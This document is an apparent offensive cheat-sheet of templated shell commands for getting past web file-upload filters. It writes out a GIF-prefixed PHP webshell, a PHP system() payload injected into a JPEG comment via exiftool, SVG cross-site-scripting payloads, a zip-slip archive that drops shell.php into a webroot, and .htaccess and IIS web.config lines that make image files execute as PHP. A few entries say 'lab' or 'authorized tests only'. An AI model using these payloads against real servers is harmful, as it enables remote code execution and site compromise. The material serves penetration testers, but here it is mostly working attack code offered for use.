
---
Description :
     GIF89a PHP webshell polyglot minimal (prepend GIF header before <?php)

Parameters : #file

```cmd
printf 'GIF89a\n<?php echo shell_exec($_GET["c"]); ?>' > {{file}}
```

```example
printf 'GIF89a\n<?php echo shell_exec($_GET["c"]); ?>' > shell.gif.php
```

Tags :  #linux #polyglot #upload #web #offensive

---

Description :
     JPEG comment field polyglot concept — exiftool inject PHP (verify parser)

Parameters : #file

```cmd
exiftool -Comment='<?php system($_GET["c"]); ?>' -o {{file}} dummy.jpg
```

```example
exiftool -Comment='<?php system($_GET["c"]); ?>' -o poly.jpg dummy.jpg
```

Tags :  #linux #polyglot #exiftool #upload #web #offensive

---

Description :
     PNG text chunk tEXt payload note — craft with pypng or hex editor

Parameters : #file

```cmd
python3 -c "import struct,zlib; d=open('{{file}}','wb'); w=lambda b:d.write(b); w(b'\\x89PNG\\r\\n\\x1a\\n'); print('use full IHDR+IDAT+tEXt chunks — verify target parser')"
```

```example
python3 -c "print('Build valid PNG with tEXt keyword UserComment containing payload')"
```

Tags :  #linux #polyglot #png #upload #web #offensive

---

Description :
     SVG with embedded script — XSS / XML viewer vector (authorized tests only)

Parameters : #file

```cmd
printf '%s\n' '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > {{file}}
```

```example
printf '%s\n' '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > xss.svg
```

Tags :  #linux #svg #xss #polyglot #web #offensive

---

Description :
     SVG foreignObject HTML payload

Parameters : #file

```cmd
printf '%s\n' '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="javascript:alert(1)"/></body></foreignObject></svg>' > {{file}}
```

```example
printf '...' > fo.svg
```

Tags :  #linux #svg #xss #offensive

---

Description :
     Zip slip pattern reminder — relative paths in archive (defensive + red team awareness)

Parameters :

```cmd
zip malicious.zip ../../var/www/html/shell.php
```

```example
echo 'never run unzip as root on untrusted zips' >&2
```

Tags :  #linux #zip #path-traversal #offensive

---

Description :
     .htaccess double extension handler — Apache only lab context

Parameters : #file

```cmd
printf 'AddType application/x-httpd-php .jpg\n' > {{file}}
```

```example
printf 'AddType application/x-httpd-php .jpg\n' > .htaccess
```

Tags :  #linux #apache #upload #offensive

---

Description :
     Web.config executable extension IIS lab snippet

Parameters : #file

```cmd
printf '%s\n' '<?xml version="1.0"?><configuration><system.webServer><handlers><add name="php" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="C:\\php\\php5isapi.dll" resourceType="File" /></handlers></system.webServer></configuration>' > {{file}}
```

```example
echo 'Adjust paths — IIS + PHP handler misconfiguration labs only'
```

Tags :  #windows #iis #upload #offensive

---
